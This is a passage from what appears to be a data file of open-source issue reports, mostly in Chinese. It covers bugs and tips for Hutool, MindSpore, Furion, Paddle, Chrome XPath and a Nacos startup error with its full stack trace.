""CONVERT"" ... ""TRANSLATE"" ... ""OVERLAY"" ... ""FLOOR"" ... ""CEIL"" ... ""CEILING"" ... ""SUBSTRING"" ... ""TRIM"" ... ""CLASSIFIER"" ... ""MATCH_NUMBER"" ... ""RUNNING"" ... ""PREV"" ... ""NEXT"" ... ""JSON_EXISTS"" ... ""JSON_VALUE"" ... ""JSON_QUERY"" ... ""JSON_OBJECT"" ... ""JSON_OBJECTAGG"" ... ""JSON_ARRAY"" ... ""JSON_ARRAYAGG"" ... &lt;LBRACE_FN&gt; ... ""MULTISET"" ... ""ARRAY"" ... ""PERIOD"" ... ""SPECIFIC"" ... ... &lt;HYPHENATED_IDENTIFIER&gt; ... &lt;QUOTED_IDENTIFIER&gt; ... &lt;BACK_QUOTED_IDENTIFIER&gt; ... &lt;BRACKET_QUOTED_IDENTIFIER&gt; ... &lt;UNICODE_QUOTED_IDENTIFIER&gt; ... ""ABS"" ... ""AVG"" ... ""CARDINALITY"" ... ""CHAR_LENGTH"" ... ""CHARACTER_LENGTH"" ... ""COALESCE"" ... ""COLLECT"" ... ""COVAR_POP"" ... ""COVAR_SAMP"" ... ""CUME_DIST"" ... ""COUNT"" ... ""CURRENT_DATE"" ... ""CURRENT_TIME"" ... ""CURRENT_TIMESTAMP"" ... ""DENSE_RANK"" ... ""ELEMENT"" ... ""EVERY"" ... ""EXP"" ... ""FIRST_VALUE"" ... ""FUSION"" ... ""INTERSECTION"" ... ""GROUPING"" ... ""HOUR"" ... ""LAG"" ... ""LEAD"" ... ""LEFT"" ... ""LAST_VALUE"" ... ""LN"" ... ""LOCALTIME"" ... ""LOCALTIMESTAMP"" ... ""LOWER"" ... ""MAX"" ... ""MIN"" ... ""MINUTE"" ... ""MOD"" ... ""MONTH"" ... ""NTH_VALUE"" ... ""NTILE"" ... ""NULLIF"" ... ""OCTET_LENGTH"" ... ""PERCENT_RANK"" ... ""POWER"" ... ""RANK"" ... ""REGR_COUNT"" ... ""REGR_SXX"" ... ""REGR_SYY"" ... ""RIGHT"" ... ""ROW_NUMBER"" ... ""SECOND"" ... ""SOME"" ... ""SQRT"" ... ""STDDEV_POP"" ... ""STDDEV_SAMP"" ... ""SUM"" ... ""UPPER"" ... ""TRUNCATE"" ... ""USER"" ... ""VAR_POP"" ... ""VAR_SAMP"" ... ""YEAR"" ... ""INSERT"" ... ""DAY"" ""("" ... ""CURRENT_CATALOG"" ... ""CURRENT_DEFAULT_TRANSFORM_GROUP"" ... ""CURRENT_PATH"" ... ""CURRENT_ROLE"" ... ""CURRENT_SCHEMA"" ... ""CURRENT_USER"" ... ""SESSION_USER"" ... ""SYSTEM_USER"" ... ""NEW"" ... ""CASE"" ... ""CURRENT"" ...   <code>: code code code code"
"去除""UTF-8;q=0.9""中分号后面的字符","使用的JDK版本和Hutool版本 JDK1.8 Hutool 最新 HttpUtil工具类,从Http连接的头信息中获得字符集为""UTF-8;q=0.9"",charset = Charset.forName(charsetName);会抛出IllegalCharsetNameException，所以需要截取字符串,示例： java.nio.charset.IllegalCharsetNameException: UTF-8;q=0.9   <code>: public static String getCharset(HttpURLConnection conn) { if (conn == null) { return null; } String charsetName = ReUtil.get(CHARSET_PATTERN, conn.getContentType(), 1); // 包含"";""的情况下，去除分号后面的 if (charsetName.contains("";"")) { charsetName = charsetName.substring(0, charsetName.indexOf("";"")); } return charsetName; }"
[CT][MS]load DivNoNan mindir run fail,": device ascend device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python div_no_nan.py RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_compile.cc:494 QueryProcess] Single op compile failed, op: diag_d_4553359938577813442_0 File ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe/impl/diag_d.py"", line 116, in diag_d element != shape_help[i + len(shape_x)] or IndexError: list index out of range RuntimeError: mindspore/ccsrc/runtime/device/gpu/kernel_info_setter.cc:99 SupportedTypeList] Unsupported op [Diag] on GPU, Please confirm whether the device target setting is correct, or refer to the official website https://mindspore.cn/ to query the operator support list. pass   <code>: import numpy as np import mindspore.nn as nn from mindspore import Tensor, export, load from mindspore import ops import mindspore from mindspore import context context.set_context(save_graphs=True, save_graphs_path=""./ir"") x = Tensor(np.array([-1.0, 0., 1.0, 5.0, 6.0]), mindspore.float32) y = Tensor(np.array([0., 0., 0., 2.0, 3.0]), mindspore.float32) class Net(nn.Cell): def __init__(self): super().__init__() self.div_no_nan = ops.DivNoNan() def construct(self, x, y): output = self.div_no_nan(x, y) return output net = Net() #output = net(x, y) #print(output) export(net, x, y, file_name=""div_no_nan.mindir"", file_format=""MINDIR"") graph = load(""div_no_nan.mindir"") gnet = nn.GraphCell(graph) gnet(x, y)"
多个项目协同作业时事件总线遇到的问题,"Furion 版本号 4.4.6 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 通用项目common，使用RabbitMq自定义事件源存储器。 Web项目WebApi，用于发布事件。 <em>没有订阅事件的实现</em> 非Web项目Scheduler，用于订阅事件，接收WebApi中发布的事件。 连续发布10个事件消息， 结果如下（一半失败，另一半被成功消费），   <code>: for (int i = 0; i &lt; size; i++) { await _eventPublisher.PublishAsync(""test"", i + 1); }"
refine pybind when *_op.cc contains several operators,"fix https://github.com/PaddlePaddle/Paddle/issues/7059#issuecomment-354111897 for most op contains several operators, such as , , etc auto pybind it by , where is the name for / etc . for other op whose is manually, such as : https://github.com/PaddlePaddle/Paddle/blob/fba6a10dd99edf6110280754555af78889f19dd3/paddle/operators/compare_op.cc#L81-L105 manually pybind them.   <code>: conv_op conv_cudnn_op REGEX MATCH REGISTER_OP(***, *** USE_OP USE_CPU_ONLY_OP REGISTER_OP compare_op"
Chrome获取XPath的方法,先按键盘F12，打开开发者工具面板，然后分两个步骤： 如图:   <code>: 1. 获得xpath：切换到Elements选项卡，右键某个DOM节点，在弹出的面板中选择Copy-&gt;xpath 2. 验证xpath：切换到Console，手动敲入 $x('这里写你获取到的xpath')， 然后在单引号里面粘贴上个步骤获取到的xpath，按回车，执行该代码后可以得到结果，以此来验证xpath
nacos启动报No DataSource set,"环境信息 pigx版本: 4.1.0 是否修改包名: 是 提供详细 /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk/Contents/Home/bin/java -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=62137:/Applications/IntelliJ IDEA.app/Contents/bin -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -Dfile.encoding=UTF-8 -classpath /Users/lorenzo/WorkSpace/Bigagr/aldserver/aldserver-register/target/classes:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-web/2.5.2/spring-boot-starter-web-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-json/2.5.2/spring-boot-starter-json-2.5.2.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.12.3/jackson-datatype-jdk8-2.12.3.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.12.3/jackson-module-parameter-names-2.12.3.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-web/5.3.8/spring-web-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-webmvc/5.3.8/spring-webmvc-5.3.8.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-api/2.0.2/nacos-api-2.0.2.jar:/Users/lorenzo/.m2/repository/org/reflections/reflections/0.9.11/reflections-0.9.11.jar:/Users/lorenzo/.m2/repository/org/javassist/javassist/3.21.0-GA/javassist-3.21.0-GA.jar:/Users/lorenzo/.m2/repository/javax/annotation/javax.annotation-api/1.3.2/javax.annotation-api-1.3.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-core/2.0.2/nacos-core-2.0.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-common/2.0.2/nacos-common-2.0.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-consistency/2.0.2/nacos-consistency-2.0.2.jar:/Users/lorenzo/.m2/repository/com/caucho/hessian/4.0.63/hessian-4.0.63.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-auth/2.0.2/nacos-auth-2.0.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-sys/2.0.2/nacos-sys-2.0.2.jar:/Users/lorenzo/.m2/repository/io/jsonwebtoken/jjwt-api/0.11.2/jjwt-api-0.11.2.jar:/Users/lorenzo/.m2/repository/io/jsonwebtoken/jjwt-impl/0.11.2/jjwt-impl-0.11.2.jar:/Users/lorenzo/.m2/repository/io/jsonwebtoken/jjwt-jackson/0.11.2/jjwt-jackson-0.11.2.jar:/Users/lorenzo/.m2/repository/com/alipay/sofa/jraft-core/1.3.5/jraft-core-1.3.5.jar:/Users/lorenzo/.m2/repository/org/ow2/asm/asm/6.0/asm-6.0.jar:/Users/lorenzo/.m2/repository/org/rocksdb/rocksdbjni/5.18.4/rocksdbjni-5.18.4.jar:/Users/lorenzo/.m2/repository/net/java/dev/jna/jna/5.5.0/jna-5.5.0.jar:/Users/lorenzo/.m2/repository/org/jctools/jctools-core/2.1.1/jctools-core-2.1.1.jar:/Users/lorenzo/.m2/repository/com/lmax/disruptor/3.3.7/disruptor-3.3.7.jar:/Users/lorenzo/.m2/repository/commons-lang/commons-lang/2.6/commons-lang-2.6.jar:/Users/lorenzo/.m2/repository/com/alipay/sofa/hessian/3.3.6/hessian-3.3.6.jar:/Users/lorenzo/.m2/repository/io/dropwizard/metrics/metrics-core/4.1.24/metrics-core-4.1.24.jar:/Users/lorenzo/.m2/repository/com/alipay/sofa/rpc-grpc-impl/1.3.5/rpc-grpc-impl-1.3.5.jar:/Users/lorenzo/.m2/repository/com/google/guava/guava/30.1-jre/guava-30.1-jre.jar:/Users/lorenzo/.m2/repository/com/google/guava/failureaccess/1.0.1/failureaccess-1.0.1.jar:/Users/lorenzo/.m2/repository/com/google/guava/listenablefuture/9999.0-empty-to-avoid-conflict-with-guava/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar:/Users/lorenzo/.m2/repository/com/google/code/findbugs/jsr305/3.0.2/jsr305-3.0.2.jar:/Users/lorenzo/.m2/repository/org/checkerframework/checker-qual/3.5.0/checker-qual-3.5.0.jar:/Users/lorenzo/.m2/repository/com/google/j2objc/j2objc-annotations/1.3/j2objc-annotations-1.3.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-jdbc/2.5.2/spring-boot-starter-jdbc-2.5.2.jar:/Users/lorenzo/.m2/repository/com/zaxxer/HikariCP/4.0.3/HikariCP-4.0.3.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-jdbc/5.3.8/spring-jdbc-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-tx/5.3.8/spring-tx-5.3.8.jar:/Users/lorenzo/.m2/repository/commons-io/commons-io/2.7/commons-io-2.7.jar:/Users/lorenzo/.m2/repository/mysql/mysql-connector-java/8.0.23/mysql-connector-java-8.0.23.jar:/Users/lorenzo/.m2/repository/org/apache/derby/derby/10.14.2.0/derby-10.14.2.0.jar:/Users/lorenzo/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar:/Users/lorenzo/.m2/repository/org/aspectj/aspectjrt/1.9.6/aspectjrt-1.9.6.jar:/Users/lorenzo/.m2/repository/cglib/cglib-nodep/2.1/cglib-nodep-2.1.jar:/Users/lorenzo/.m2/repository/org/apache/httpcomponents/httpasyncclient/4.1.4/httpasyncclient-4.1.4.jar:/Users/lorenzo/.m2/repository/org/apache/httpcomponents/httpcore-nio/4.4.14/httpcore-nio-4.4.14.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/2.5.2/spring-boot-starter-tomcat-2.5.2.jar:/Users/lorenzo/.m2/repository/jakarta/annotation/jakarta.annotation-api/1.3.5/jakarta.annotation-api-1.3.5.jar:/Users/lorenzo/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/9.0.48/tomcat-embed-websocket-9.0.48.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.12.3/jackson-core-2.12.3.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.12.3/jackson-databind-2.12.3.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.12.3/jackson-annotations-2.12.3.jar:/Users/lorenzo/.m2/repository/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar:/Users/lorenzo/.m2/repository/io/micrometer/micrometer-registry-prometheus/1.7.1/micrometer-registry-prometheus-1.7.1.jar:/Users/lorenzo/.m2/repository/io/prometheus/simpleclient_common/0.10.0/simpleclient_common-0.10.0.jar:/Users/lorenzo/.m2/repository/io/micrometer/micrometer-registry-influx/1.7.1/micrometer-registry-influx-1.7.1.jar:/Users/lorenzo/.m2/repository/io/micrometer/micrometer-registry-elastic/1.7.1/micrometer-registry-elastic-1.7.1.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-aop/2.5.2/spring-boot-starter-aop-2.5.2.jar:/Users/lorenzo/.m2/repository/org/aspectj/aspectjweaver/1.9.6/aspectjweaver-1.9.6.jar:/Users/lorenzo/.m2/repository/org/yaml/snakeyaml/1.28/snakeyaml-1.28.jar:/Users/lorenzo/.m2/repository/org/apache/tomcat/embed/tomcat-embed-jasper/9.0.48/tomcat-embed-jasper-9.0.48.jar:/Users/lorenzo/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.48/tomcat-embed-core-9.0.48.jar:/Users/lorenzo/.m2/repository/org/apache/tomcat/tomcat-annotations-api/9.0.48/tomcat-annotations-api-9.0.48.jar:/Users/lorenzo/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/9.0.48/tomcat-embed-el-9.0.48.jar:/Users/lorenzo/.m2/repository/org/eclipse/jdt/ecj/3.18.0/ecj-3.18.0.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar:/Users/lorenzo/.m2/repository/io/netty/netty-all/4.1.65.Final/netty-all-4.1.65.Final.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot/2.5.2/spring-boot-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-context/5.3.8/spring-context-5.3.8.jar:/Users/lorenzo/.m2/repository/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar:/Users/lorenzo/.m2/repository/org/codehaus/jackson/jackson-core-asl/1.9.13/jackson-core-asl-1.9.13.jar:/Users/lorenzo/.m2/repository/org/slf4j/slf4j-api/1.7.31/slf4j-api-1.7.31.jar:/Users/lorenzo/.m2/repository/ch/qos/logback/logback-core/1.2.3/logback-core-1.2.3.jar:/Users/lorenzo/.m2/repository/org/apache/mina/mina-core/2.0.0-RC1/mina-core-2.0.0-RC1.jar:/Users/lorenzo/.m2/repository/org/javatuples/javatuples/1.2/javatuples-1.2.jar:/Users/lorenzo/.m2/repository/org/apache/httpcomponents/httpcore/4.4.14/httpcore-4.4.14.jar:/Users/lorenzo/.m2/repository/org/apache/httpcomponents/httpclient/4.5.13/httpclient-4.5.13.jar:/Users/lorenzo/.m2/repository/commons-codec/commons-codec/1.15/commons-codec-1.15.jar:/Users/lorenzo/.m2/repository/org/slf4j/log4j-over-slf4j/1.7.31/log4j-over-slf4j-1.7.31.jar:/Users/lorenzo/.m2/repository/org/slf4j/jcl-over-slf4j/1.7.31/jcl-over-slf4j-1.7.31.jar:/Users/lorenzo/.m2/repository/org/slf4j/jul-to-slf4j/1.7.31/jul-to-slf4j-1.7.31.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-cmdb/2.0.2/nacos-cmdb-2.0.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-istio/2.0.2/nacos-istio-2.0.2.jar:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-client/2.0.2/nacos-client-2.0.2.jar:/Users/lorenzo/.m2/repository/io/prometheus/simpleclient/0.5.0/simpleclient-0.5.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-netty-shaded/1.24.0/grpc-netty-shaded-1.24.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-core/1.24.0/grpc-core-1.24.0.jar:/Users/lorenzo/.m2/repository/com/google/code/gson/gson/2.8.7/gson-2.8.7.jar:/Users/lorenzo/.m2/repository/com/google/android/annotations/4.1.1.4/annotations-4.1.1.4.jar:/Users/lorenzo/.m2/repository/io/perfmark/perfmark-api/0.17.0/perfmark-api-0.17.0.jar:/Users/lorenzo/.m2/repository/io/opencensus/opencensus-api/0.21.0/opencensus-api-0.21.0.jar:/Users/lorenzo/.m2/repository/io/opencensus/opencensus-contrib-grpc-metrics/0.21.0/opencensus-contrib-grpc-metrics-0.21.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-protobuf/1.24.0/grpc-protobuf-1.24.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-api/1.24.0/grpc-api-1.24.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-context/1.24.0/grpc-context-1.24.0.jar:/Users/lorenzo/.m2/repository/com/google/errorprone/error_prone_annotations/2.3.2/error_prone_annotations-2.3.2.jar:/Users/lorenzo/.m2/repository/org/codehaus/mojo/animal-sniffer-annotations/1.17/animal-sniffer-annotations-1.17.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-protobuf-lite/1.24.0/grpc-protobuf-lite-1.24.0.jar:/Users/lorenzo/.m2/repository/io/grpc/grpc-stub/1.24.0/grpc-stub-1.24.0.jar:/Users/lorenzo/.m2/repository/com/google/api/grpc/proto-google-common-protos/1.17.0/proto-google-common-protos-1.17.0.jar:/Users/lorenzo/.m2/repository/com/google/protobuf/protobuf-java/3.8.0/protobuf-java-3.8.0.jar:/Users/lorenzo/.m2/repository/io/envoyproxy/controlplane/api/0.1.27/api-0.1.27.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-security/2.5.2/spring-boot-starter-security-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter/2.5.2/spring-boot-starter-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/2.5.2/spring-boot-autoconfigure-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-logging/2.5.2/spring-boot-starter-logging-2.5.2.jar:/Users/lorenzo/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.14.1/log4j-to-slf4j-2.14.1.jar:/Users/lorenzo/.m2/repository/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-aop/5.3.8/spring-aop-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-beans/5.3.8/spring-beans-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/security/spring-security-config/5.5.1/spring-security-config-5.5.1.jar:/Users/lorenzo/.m2/repository/org/springframework/security/spring-security-core/5.5.1/spring-security-core-5.5.1.jar:/Users/lorenzo/.m2/repository/org/springframework/security/spring-security-crypto/5.5.1/spring-security-crypto-5.5.1.jar:/Users/lorenzo/.m2/repository/org/springframework/security/spring-security-web/5.5.1/spring-security-web-5.5.1.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-expression/5.3.8/spring-expression-5.3.8.jar:/Users/lorenzo/.m2/repository/cn/hutool/hutool-system/5.7.3/hutool-system-5.7.3.jar:/Users/lorenzo/.m2/repository/cn/hutool/hutool-core/5.7.3/hutool-core-5.7.3.jar:/Users/lorenzo/.m2/repository/org/springframework/cloud/spring-cloud-starter-bootstrap/3.0.3/spring-cloud-starter-bootstrap-3.0.3.jar:/Users/lorenzo/.m2/repository/org/springframework/cloud/spring-cloud-starter/3.0.3/spring-cloud-starter-3.0.3.jar:/Users/lorenzo/.m2/repository/org/springframework/cloud/spring-cloud-context/3.0.3/spring-cloud-context-3.0.3.jar:/Users/lorenzo/.m2/repository/org/springframework/cloud/spring-cloud-commons/3.0.3/spring-cloud-commons-3.0.3.jar:/Users/lorenzo/.m2/repository/org/springframework/security/spring-security-rsa/1.0.10.RELEASE/spring-security-rsa-1.0.10.RELEASE.jar:/Users/lorenzo/.m2/repository/org/bouncycastle/bcpkix-jdk15on/1.68/bcpkix-jdk15on-1.68.jar:/Users/lorenzo/.m2/repository/org/bouncycastle/bcprov-jdk15on/1.68/bcprov-jdk15on-1.68.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-configuration-processor/2.5.2/spring-boot-configuration-processor-2.5.2.jar:/Users/lorenzo/.m2/repository/com/github/ulisesbocchio/jasypt-spring-boot-starter/3.0.3/jasypt-spring-boot-starter-3.0.3.jar:/Users/lorenzo/.m2/repository/com/github/ulisesbocchio/jasypt-spring-boot/3.0.3/jasypt-spring-boot-3.0.3.jar:/Users/lorenzo/.m2/repository/org/jasypt/jasypt/1.9.3/jasypt-1.9.3.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-starter-actuator/2.5.2/spring-boot-starter-actuator-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-actuator-autoconfigure/2.5.2/spring-boot-actuator-autoconfigure-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-actuator/2.5.2/spring-boot-actuator-2.5.2.jar:/Users/lorenzo/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.12.3/jackson-datatype-jsr310-2.12.3.jar:/Users/lorenzo/.m2/repository/io/micrometer/micrometer-core/1.7.1/micrometer-core-1.7.1.jar:/Users/lorenzo/.m2/repository/org/hdrhistogram/HdrHistogram/2.1.12/HdrHistogram-2.1.12.jar:/Users/lorenzo/.m2/repository/org/latencyutils/LatencyUtils/2.0.3/LatencyUtils-2.0.3.jar:/Users/lorenzo/.m2/repository/de/codecentric/spring-boot-admin-starter-client/2.4.2/spring-boot-admin-starter-client-2.4.2.jar:/Users/lorenzo/.m2/repository/de/codecentric/spring-boot-admin-client/2.4.2/spring-boot-admin-client-2.4.2.jar:/Users/lorenzo/.m2/repository/org/projectlombok/lombok/1.18.20/lombok-1.18.20.jar:/Users/lorenzo/.m2/repository/org/springframework/boot/spring-boot-test/2.5.2/spring-boot-test-2.5.2.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-core/5.3.8/spring-core-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-jcl/5.3.8/spring-jcl-5.3.8.jar:/Users/lorenzo/.m2/repository/org/springframework/spring-test/5.3.8/spring-test-5.3.8.jar com.alibaba.nacos.AldserverNacosApplication 2021-07-15 11:51:46.402 INFO 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos started successfully in stand alone mode. use external storage ,--,: : | Nacos ,| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 1668 | : ' '; | / \ / . ; ,. :| : /. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | --' / / ,. |' | '.'|\ \ / / /----' '--'. / ; |.' | , .-./\ \ / ------' 2021-07-15 11:51:48.286 INFO 1668 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=f6ad6b48-9196-395a-862d-2c93cc0d0a4b 2021-07-15 11:51:48.455 INFO 1668 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@1fc4b8d6' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-07-15 11:51:48.458 INFO 1668 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-07-15 11:51:48.737 INFO 1668 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2021-07-15 11:51:48.934 INFO 1668 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 2375 ms 2021-07-15 11:51:57.779 WARN 1668 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'externalDumpService': Invocation of init method failed; nested exception is ErrCode:500, ErrMsg:Nacos Server did not start because dumpservice bean construction failure : No DataSource set 2021-07-15 11:51:57.799 INFO 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: /Users/lorenzo/nacos/logs 2021-07-15 11:51:57.799 INFO 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: /Users/lorenzo/nacos/conf 2021-07-15 11:51:57.799 INFO 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: /Users/lorenzo/nacos/data 2021-07-15 11:51:57.800 ERROR 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Startup errors : org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'externalDumpService': Invocation of init method failed; nested exception is ErrCode:500, ErrMsg:Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.AldserverNacosApplication.main(AldserverNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'externalDumpService': Invocation of init method failed; nested exception is ErrCode:500, ErrMsg:Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:660) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1413) at 